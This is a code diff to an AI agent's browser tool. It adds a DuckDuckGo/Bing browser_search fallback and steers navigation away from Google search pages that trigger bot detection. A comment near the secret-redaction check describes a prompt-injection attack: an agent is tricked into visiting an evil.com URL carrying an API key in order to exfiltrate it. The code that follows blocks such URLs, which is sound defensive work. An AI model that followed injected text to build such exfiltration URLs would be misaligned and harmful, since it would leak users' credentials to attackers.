@@ -62,6 +62,7 @@ import sys
 import tempfile
 import threading
 import time
+import urllib.parse
 import requests
 from typing import Dict, Any, Optional, List
 from pathlib import Path
@@ -185,6 +186,13 @@ _BOT_DETECTION_PATTERNS = (
     "verify you are human",
     "press and hold",
 )
+
+_BROWSER_SEARCH_ENGINES = (
+    ("duckduckgo", "https://duckduckgo.com/?q={query}&ia=web"),
+    ("bing", "https://www.bing.com/search?q={query}"),
+)
+
+_MAIN_GOOGLE_HOST_RE = re.compile(r"^(?:www\.)?google\.[a-z.]+$", re.IGNORECASE)
 
 # Commands that legitimately return empty stdout (e.g. close, record).
 _EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})
@@ -675,7 +683,7 @@ atexit.register(_stop_browser_cleanup_thread)
 BROWSER_TOOL_SCHEMAS = [
     {
         "name": "browser_navigate",
-        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). If you must use browser tools for search because web search tools are unavailable, prefer direct result pages or low-friction engines like DuckDuckGo/Bing instead of Google search pages, which often trigger bot detection. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
+        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). When browser tools are your only search option, prefer browser_search instead of manually opening a search-engine homepage. Use browser tools when you need to interact with a page (click, fill forms, dynamic content) or open a specific known URL. Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -685,6 +693,20 @@ BROWSER_TOOL_SCHEMAS = [
                 }
             },
             "required": ["url"]
+        }
+    },
+    {
+        "name": "browser_search",
+        "description": "Search the web using a browser-safe search flow when browser tools are your only lookup option. Tries DuckDuckGo first and falls back to Bing if needed, then returns the result page with a compact snapshot and interactive ref IDs. Prefer this over manually navigating to Google or another search-engine homepage.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "query": {
+                    "type": "string",
+                    "description": "The web search query to look up in the browser"
+                }
+            },
+            "required": ["query"]
         }
     },
     {
@@ -1316,9 +1338,45 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
 def _detect_bot_detection_signal(*parts: str) -> str | None:
     """Return the first recognizable bot-detection pattern in the provided text."""
     haystack = "\n".join(part for part in parts if part).lower()
-    for pattern in _BOT_DETECTION_PATTERNS:
-        if pattern in haystack:
-            return pattern
+    matches = [pattern for pattern in _BOT_DETECTION_PATTERNS if pattern in haystack]
+    if not matches:
+        return None
+    return max(matches, key=len)
+
+
+def _parse_browser_target_url(url: str) -> urllib.parse.ParseResult:
+    """Parse a browser target URL, assuming https:// when no scheme is present."""
+    candidate = (url or "").strip()
+    if candidate and "://" not in candidate:
+        candidate = f"https://{candidate}"
+    return urllib.parse.urlparse(candidate)
+
+
+def _build_browser_search_urls(query: str) -> list[tuple[str, str]]:
+    """Return preferred browser-search URLs for the given query."""
+    normalized_query = " ".join((query or "").split())
+    encoded_query = urllib.parse.quote_plus(normalized_query)
+    return [
+        (engine, template.format(query=encoded_query))
+        for engine, template in _BROWSER_SEARCH_ENGINES
+    ]
+
+
+def _google_search_guidance(url: str) -> str | None:
+    """Return guidance when browser_navigate is pointed at Google search pages."""
+    parsed = _parse_browser_target_url(url)
+    host = (parsed.hostname or "").lower()
+    path = parsed.path or "/"
+    if not _MAIN_GOOGLE_HOST_RE.fullmatch(host):
+        return None
+
+    if path in ("", "/", "/search"):
+        return (
+            "Google search pages often trigger bot detection in browser-only lookup flows. "
+            "Use browser_search with the query instead, or navigate directly to a known "
+            "result page or a DuckDuckGo/Bing search URL that already includes the query."
+        )
+
     return None
 
 
@@ -1341,7 +1399,6 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
     from agent.redact import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
@@ -1370,6 +1427,15 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             "error": blocked["message"],
             "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
         })
+
+    google_guidance = _google_search_guidance(url)
+    if google_guidance:
+        return json.dumps({
+            "success": False,
+            "error": google_guidance,
+            "discouraged_search_target": True,
+            "url": url,
+        }, ensure_ascii=False)
 
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
@@ -1451,8 +1517,10 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
                     "error": (
                         f"Browser navigation hit a bot-detection or access challenge "
                         f"('{matched_pattern}') at {final_url or url}. Prefer non-browser web "
-                        "search/extract tools, a direct result page, or a deterministic local "
-                        "tool such as terminal/execute_code when possible."
+                        "search/extract tools when available, or a deterministic local tool "
+                        "such as terminal/execute_code when possible. If browser tools are your "
+                        "only lookup option, retry immediately with browser_search or a direct "
+                        "DuckDuckGo/Bing result URL instead of stopping after this blocked page."
                     ),
                     "bot_detection_detected": True,
                     "challenge_pattern": matched_pattern,
@@ -1469,6 +1537,56 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             "success": False,
             "error": result.get("error", "Navigation failed")
         }, ensure_ascii=False)
+
+
+def browser_search(query: str, task_id: Optional[str] = None) -> str:
+    """Search the web with browser-safe engines and retry across engines automatically."""
+    normalized_query = " ".join((query or "").split())
+    if not normalized_query:
+        return json.dumps({
+            "success": False,
+            "error": "Search query cannot be empty",
+        }, ensure_ascii=False)
+
+    attempts: list[dict[str, Any]] = []
+    last_result: dict[str, Any] = {}
+
+    for engine, search_url in _build_browser_search_urls(normalized_query):
+        result = json.loads(browser_navigate(search_url, task_id=task_id))
+        attempts.append(
+            {
+                "engine": engine,
+                "url": search_url,
+                "success": bool(result.get("success")),
+                **({"error": result.get("error")} if result.get("error") else {}),
+                **({"bot_detection_detected": True} if result.get("bot_detection_detected") else {}),
+            }
+        )
+        last_result = result
+        if result.get("success"):
+            result["search_engine"] = engine
+            result["search_query"] = normalized_query
+            result["search_url"] = search_url
+            if len(attempts) > 1:
+                result["attempted_engines"] = [attempt["engine"] for attempt in attempts]
+            return json.dumps(result, ensure_ascii=False)
+
+    return json.dumps(
+        {
+            "success": False,
+            "error": (
+                f"Browser search failed for query '{normalized_query}'. Tried "
+                f"{', '.join(attempt['engine'] for attempt in attempts)}. "
+                f"Last error: {last_result.get('error', 'Unknown browser search error')}"
+            ),
+            "search_query": normalized_query,
+            "attempted_engines": [attempt["engine"] for attempt in attempts],
+            "attempted_urls": [attempt["url"] for attempt in attempts],
+            **({"bot_detection_detected": True} if any(attempt.get("bot_detection_detected") for attempt in attempts) else {}),
+            **({"challenge_pattern": last_result.get("challenge_pattern")} if last_result.get("challenge_pattern") else {}),
+        },
+        ensure_ascii=False,
+    )
 
 
 def browser_snapshot(
@@ -2374,6 +2492,14 @@ registry.register(
     handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
     emoji="🌐",
+)
+registry.register(
+    name="browser_search",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_search"],
+    handler=lambda args, **kw: browser_search(query=args.get("query", ""), task_id=kw.get("task_id")),
+    check_fn=check_browser_requirements,
+    emoji="🔎",
 )
 registry.register(
     name="browser_snapshot",
